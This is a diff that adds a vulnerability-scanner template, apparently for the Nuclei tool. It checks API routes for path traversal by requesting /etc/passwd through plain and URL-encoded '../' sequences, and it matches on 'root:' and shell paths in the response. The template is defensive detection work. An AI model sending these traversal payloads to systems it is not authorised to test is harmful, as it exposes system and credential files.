@@ -1,0 +1,22 @@
+id: path-traversal-routes
+
+info:
+  name: Path traversal via API routes
+  author: boilerhouse-security
+  severity: critical
+  tags: path-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/../../etc/passwd"
+      - "{{BaseURL}}/api/v1/..%2f..%2fetc%2fpasswd"
+      - "{{BaseURL}}/api/v1/%2e%2e/%2e%2e/etc/passwd"
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "/bin/sh"
+          - "/bin/bash"
+        condition: or
